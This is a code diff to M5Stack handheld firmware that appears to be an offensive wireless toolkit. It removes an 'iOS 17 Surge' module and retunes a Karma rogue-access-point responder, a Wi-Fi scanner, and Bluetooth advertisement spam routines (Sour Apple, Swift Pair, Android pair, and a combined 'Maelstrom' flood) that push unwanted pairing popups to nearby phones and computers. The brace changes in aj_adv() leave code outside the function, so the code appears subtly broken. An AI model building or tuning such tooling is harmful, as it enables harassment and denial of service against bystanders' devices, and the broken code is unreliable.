@@ -151,12 +151,11 @@ void wf_flood_setup();
 void wf_flood_loop();
 
 // Aurum Elite Prototypes
-void ios17_surge_setup();
-void ios17_surge_loop();
 void karma_hunter_setup();
 void karma_hunter_loop();
 void signal_hunter_setup();
-void signal_hunter_loop();
+void signal_hunter_loop_wrapper();
+void signal_hunter_process_results(String target_ssid);
 void wf_mix_setup();
 void wf_mix_loop();
 void wf_mouse_setup();
@@ -433,7 +432,6 @@ long m_win_cnt = 0;
 String apSsidName = String("");
 bool isSwitching = true;
 
-#include "ios17_surge.h"
 #include "karma_hunter.h"
 #include "signal_hunter.h"
 
@@ -546,20 +544,21 @@ void switcher_button_proc() {
 
 // Tap the power button from pretty much anywhere to get to the main menu
 void check_menu_press() {
+  bool isPressed = false;
 #if defined(AXP)
   M5.update();
-  if (M5.Power.getKeyState()) {
+  if (M5.Power.getKeyState()) isPressed = true;
 #endif
 #if defined(KB)
-  if (M5Cardputer.Keyboard.isKeyPressed(',') || M5Cardputer.Keyboard.isKeyPressed('`')){
+  if (M5Cardputer.Keyboard.isKeyPressed(',') || M5Cardputer.Keyboard.isKeyPressed('`')) isPressed = true;
 #endif
 #if defined(M5_BUTTON_MENU) && !defined(STICKS3)
-  if (digitalRead(M5_BUTTON_MENU) == LOW){
+  if (digitalRead(M5_BUTTON_MENU) == LOW) isPressed = true;
 #endif
-#if defined(AXP) || defined(KB) || (defined(M5_BUTTON_MENU) && !defined(STICKS3))
+
+  if (isPressed && rstOverride == false && !isSwitching) {
     dimtimer();
     if(portal_active){
-      // just in case we escape the portal with the main menu button
       shutdownWebServer();
       portal_active = false;
     }
@@ -568,7 +567,6 @@ void check_menu_press() {
     current_proc = 1;
     delay(100);
   }
-#endif
 }
 
 bool check_next_press(){
@@ -693,7 +691,6 @@ MenuController menuController;
 /// iOS Warfare MENU ///
 MENU iosmenu[] = {
   { "Back", 1},
-  { "iOS 17 Surge", 80},
   { "AirTag Phantom", 42},
   { "HomeKit Siege", 43},
   { "SA v2 Turbo", 44},
@@ -1710,7 +1707,7 @@ void timeset_setup() {
     DISP.setCursor(0, 0);
     DISP.println(TXT_SET_HOUR);
     delay(2000);
-  }
+}
 
   void timeset_loop() {
   #if defined(STICK_C_PLUS2) || defined(STICK_C) || defined(STICK_C_PLUS)
@@ -2049,16 +2046,15 @@ void aj_adv(){
   // of the background stuff easier (menu button, dimmer, etc)
   rstOverride = true;
   if (sourApple || swiftPair || androidPair || maelstrom){
-    delay(20);   // 20ms — stable, tested working
-    advtime = 0; // bypass ajDelay counter
+    delay(30);    // 30ms — The Legend (Stable & High Impact)
+    advtime = 0;  // Keep override
   }
   if (millis() > advtime + ajDelay){
     advtime = millis();
-    pAdvertising->stop(); // This is placed here mostly for timing.
-                          // It allows the BLE beacon to run through the loop.
+    pAdvertising->stop(); 
     BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
     if (sourApple){
-      Serial.print(TXT_SA_ADV);
+      if (!maelstrom) Serial.print(TXT_SA_ADV);
       uint8_t packet[17];
       uint8_t size = 17;
       uint8_t i = 0;
@@ -2081,7 +2077,7 @@ void aj_adv(){
     } else if (swiftPair) {
       oAdvertisementData.setFlags(0x06); // General Discoverable Mode & BR/EDR Not Supported
       const char* display_name = (windowsNameOverride == nullptr) ? generateRandomName() : windowsNameOverride;
-      Serial.printf(TXT_SP_ADV, display_name);
+      if (!maelstrom) Serial.printf(TXT_SP_ADV, display_name);
       uint8_t display_name_len = (strlen(display_name) > 19) ? 19 : strlen(display_name); // Safety Truncate
       uint8_t w_size = 7 + display_name_len;
       uint8_t* w_packet = (uint8_t*)malloc(w_size);
@@ -2101,7 +2097,7 @@ void aj_adv(){
       free(w_packet);
       if (windowsNameOverride == nullptr) free((void*)display_name);
     } else if (androidPair) {
-      Serial.print(TXT_AD_SPAM_ADV);
+      if (!maelstrom) Serial.print(TXT_AD_SPAM_ADV);
       uint8_t packet[14];
       uint8_t i = 0;
       packet[i++] = 3;  // Packet Length
@@ -2161,17 +2157,17 @@ void aj_adv(){
       }
       
       oAdvertisementData.addData(std::string((char*)packet, sz));
-    }
-    // COMMON PATH: All branches above add data. Now broadcast it.
-    pAdvertising->setAdvertisementData(oAdvertisementData);
-    pAdvertising->start();
-    
-#if defined(M5LED)
-    digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
-    delay(5);
-    digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
-#endif
   }
+  // COMMON PATH: All branches above add data. Now broadcast it.
+  pAdvertising->setAdvertisementData(oAdvertisementData);
+  pAdvertising->start();
+  
+#if defined(M5LED)
+  digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
+  delay(5);
+  digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
+#endif
+}
   if (check_next_press()) {
     if (current_proc >= 62 && current_proc <= 65) { // Windows Warfare Modules
       isSwitching = true;
@@ -2367,13 +2363,19 @@ MENU wsmenu[] = {
   { "Nova Portal", 19},
   { "Deauth Hunter", 24},
   { "Karma 2.0 Hunter", 81},
-  { "Back", 1},
+  { "Back", 5},
 };
 int wsmenu_size = sizeof(wsmenu) / sizeof (MENU);
 
 void wsmenu_setup() {
   cursor = 0;
   rstOverride = true;
+  wsmenu[0].name = TXT_BACK;
+  wsmenu[1].name = TXT_WF_SCN;
+  wsmenu[2].name = "Beacon Spam 1";
+  wsmenu[3].name = "Beacon Spam 2";
+  wsmenu[4].name = "Beacon Spam 3";
+  wsmenu[8].name = TXT_BACK;
   drawmenu(wsmenu, wsmenu_size);
   delay(500); // Prevent switching after menu loads up
 }
@@ -2416,6 +2418,9 @@ void wsmenu_loop() {
         break;
       case 26:
         current_proc = 26;
+        break;
+      case 81:
+        current_proc = 81;
         break;
     }
   }
@@ -2899,9 +2904,8 @@ ProcessHandler processes[] = {
   {65, wf_kb_setup, wf_kb_loop, "Surface KB Siege"},
   {71, wf_ctr_setup, wf_ctr_loop, "Warfare Center Menu"},
   {72, maelstrom_setup, maelstrom_loop, "Universal Maelstrom"},
-  {80, ios17_surge_setup, ios17_surge_loop, "iOS 17 Surge"},
   {81, karma_hunter_setup, karma_hunter_loop, "Karma Hunter"},
-  {82, signal_hunter_setup, signal_hunter_loop, "Signal Hunter"},
+  {82, signal_hunter_setup, signal_hunter_loop_wrapper, "Signal Hunter"},
 #if defined(SDCARD) && !defined(CARDPUTER)
   {97, nullptr, ToggleSDCard, "SD Card"},
 #endif
@@ -2909,31 +2913,41 @@ ProcessHandler processes[] = {
 };
 
 // --- Aurum Elite Wrappers ---
-void ios17_surge_setup() { 
-  DISP.fillScreen(BLACK); DISP.setCursor(0,0); DISP.setTextColor(FGCOLOR); 
-  DISP.println(" iOS 17 Surge\n ACTIVATE..."); delay(1000); ios17_surge_start(0); 
-}
-void ios17_surge_loop() { if(check_select_press()) { ios17_surge_stop(); isSwitching=true; current_proc=41; } }
-
 void karma_hunter_setup() { 
   DISP.fillScreen(BLACK); DISP.setCursor(0,0); DISP.setTextColor(FGCOLOR); 
   DISP.println(" Karma 2.0\n Sniffing Probes..."); karma_hunter_start(); 
 }
-void karma_hunter_loop() { karma_respond_to_all(); if(check_select_press()) { karma_hunter_stop(); isSwitching=true; current_proc=12; } }
+void karma_hunter_loop() { 
+  static uint32_t last_respond = 0;
+  if (millis() - last_respond > 2000) { // Throttled respond logic
+    last_respond = millis();
+    karma_respond_to_all(); 
+  }
+  if(check_select_press()) { 
+    karma_hunter_stop(); 
+    isSwitching=true; 
+    current_proc=12; 
+  } 
+  delay(1); // Breath
+}
 
 void signal_hunter_setup() { 
   DISP.fillScreen(BLACK); DISP.setCursor(0,0); DISP.setTextColor(FGCOLOR); 
   DISP.println(" Signal Stalker\n Radar Scan..."); delay(800); 
 }
-void signal_hunter_loop() { 
-  // Track first detected SSID for demo
-  if(WiFi.scanComplete() <= -1 && WiFi.scanComplete() != -2) WiFi.scanNetworks(true);
+void signal_hunter_loop_wrapper() { 
+  static uint32_t last_scan = 0;
+  // Non-blocking scan logic with 800ms cooldown
+  if(WiFi.scanComplete() <= -1 && WiFi.scanComplete() != -2 && (millis() - last_scan > 800)) {
+    WiFi.scanNetworks(true);
+  }
   if(WiFi.scanComplete() >= 0) {
-    if(WiFi.scanComplete() > 0) signal_hunter_loop(WiFi.SSID(0));
+    if(WiFi.scanComplete() > 0) signal_hunter_process_results(WiFi.SSID(0));
     WiFi.scanDelete();
-    WiFi.scanNetworks(true); // Restart scan
+    last_scan = millis(); // Start cooldown
   }
   if(check_select_press()) { isSwitching=true; current_proc=1; } 
+  delay(1); // Breath
 }
 
 void rebuildMenus() {
@@ -2950,6 +2964,7 @@ void rebuildMenus() {
   #endif
   mmenu[i++].name = TXT_MN_QR;
   mmenu[i++].name = TXT_MN_WF_CTR;
+  mmenu[i++].name = "Signal Stalker";
   mmenu[i++].name = TXT_SETTINGS;
 
   // Settings Menu labels
@@ -4591,10 +4606,11 @@ void at_phantom_setup() {
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.println("Sending popups...");
   DISP.println(TXT_SEL_EXIT2);
+  delay(200); while(check_select_press()); // Safety release
 }
 
 void at_phantom_loop() {
-  sourApple = true;
+  sourApple = true; swiftPair = false; androidPair = false;
   aj_adv();
   if (check_next_press()) {
     pAdvertising->stop();
@@ -4641,6 +4657,7 @@ void sa_turbo_setup() {
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.println("Max speed popups...");
   DISP.println(TXT_SEL_EXIT2);
+  delay(200); while(check_select_press()); // Safety release
 }
 
 void sa_turbo_loop() {
@@ -4666,6 +4683,7 @@ void sa_mix_setup() {
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.println("Rotating popups...");
   DISP.println(TXT_SEL_EXIT2);
+  delay(200); while(check_select_press()); // Safety release
 }
 
 void sa_mix_loop() {
@@ -4739,6 +4757,7 @@ void af_flood_setup() {
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.println("Sending popups...");
   DISP.println(TXT_SEL_EXIT2);
+  delay(200); while(check_select_press()); // Safety release
 }
 
 void af_flood_loop() {
@@ -4919,8 +4938,8 @@ void maelstrom_setup() {
   
   // Progress bar background
   DISP.drawRect(5, 45, 125, 12, WHITE);
+  delay(200); while(check_select_press()); // Safety release
 }
-
 void maelstrom_loop() {
   maelstrom = true;
   
@@ -4929,6 +4948,7 @@ void maelstrom_loop() {
   for(int i=0; i<3; i++) { 
     aj_adv(); 
     m_apple_cnt++; 
+    delay(1); // Task yield
   }
   
   // BURST MODE: 3x Windows (Force null override to ensure name rotation)
@@ -4937,6 +4957,7 @@ void maelstrom_loop() {
   for(int i=0; i<3; i++) { 
     aj_adv(); 
     m_win_cnt++; 
+    delay(1); // Task yield
   }
 
   // BURST MODE: 3x Android (Force -1 to ensure model rotation)
@@ -4945,22 +4966,28 @@ void maelstrom_loop() {
   for(int i=0; i<3; i++) { 
     aj_adv(); 
     m_andro_cnt++; 
+    delay(1); // Task yield
   }
 
-  // UI Update (Chaos Dynamic)
-  if (millis() % 400 < 50) { 
-    DISP.fillRect(7, 47, 121, 8, RED); // Dynamic Flicker
-  } else {
-    DISP.fillRect(7, 47, 121, 8, BLACK);
+  // UI Update (Throttled to 250ms for performance)
+  static uint32_t last_maelstrom_ui = 0;
+  if (millis() - last_maelstrom_ui > 250) {
+    last_maelstrom_ui = millis();
+    
+    if (millis() % 400 < 50) { 
+      DISP.fillRect(7, 47, 121, 8, RED); // Dynamic Flicker
+    } else {
+      DISP.fillRect(7, 47, 121, 8, BLACK);
+    }
+    
+    DISP.setTextColor(WHITE, BLACK);
+    DISP.setCursor(5, 65);
+    DISP.printf("Apple   : %-8ld", m_apple_cnt);
+    DISP.setCursor(5, 80);
+    DISP.printf("Android : %-8ld", m_andro_cnt);
+    DISP.setCursor(5, 95);
+    DISP.printf("Windows : %-8ld", m_win_cnt);
   }
-  
-  DISP.setTextColor(WHITE, BLACK);
-  DISP.setCursor(5, 65);
-  DISP.printf("Apple   : %-8ld", m_apple_cnt);
-  DISP.setCursor(5, 80);
-  DISP.printf("Android : %-8ld", m_andro_cnt);
-  DISP.setCursor(5, 95);
-  DISP.printf("Windows : %-8ld", m_win_cnt);
   
   DISP.setCursor(5, 120);
   DISP.setTextColor(RED, BLACK);
